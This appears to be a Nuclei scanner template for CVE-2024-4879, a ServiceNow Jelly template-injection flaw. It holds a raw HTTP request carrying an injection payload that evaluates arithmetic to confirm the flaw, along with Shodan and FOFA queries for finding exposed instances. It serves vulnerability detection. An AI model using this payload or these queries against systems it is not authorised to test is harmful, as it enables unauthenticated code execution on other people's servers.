http:
- matchers:
  - part: body
    type: word
    words:
    - <div class="outputmsg_text">1787569</div>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /login.do?jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-4879
info:
  author: DhiyaneshDk,ritikchaddha
  classification:
    epss-percentile: 0.99953
    epss-score: 0.94349
  description: "ServiceNow has addressed an input validation vulnerability that was\
    \ identified in Vancouver and Washington DC Now Platform releases. This vulnerability\
    \ could enable an unauthenticated user to remotely execute code within the context\
    \ of the Now Platform.\_ServiceNow applied an update to hosted instances, and\
    \ ServiceNow released the update to our partners and self-hosted customers. Listed\
    \ below are the patches and hot fixes that address the vulnerability. If you have\
    \ not done so already, we recommend applying security patches relevant to your\
    \ instance as soon as possible.\n"
  impact: 'Unauthenticated attackers can exploit SSTI to execute arbitrary code on
    ServiceNow servers.

    '
  metadata:
    fofa-query:
    - icon_hash=1701804003
    - title="servicenow"
    google-query: intitle:"servicenow"
    max-request: 1
    product: servicenow
    shodan-query:
    - http.favicon.hash:"1701804003"
    - http.title:"servicenow"
    vendor: servicenow
    verified: true
  name: ServiceNow UI Macros - Template Injection
  reference:
  - https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data
  - https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1644293
  - https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1645154
  - https://nvd.nist.gov/vuln/detail/CVE-2024-4879
  remediation: 'Apply security patches for ServiceNow as per KB1644293 and KB1645154.

    '
  severity: critical
  tags: cve,cve2024,servicenow,ssti,kev,vkev,vuln
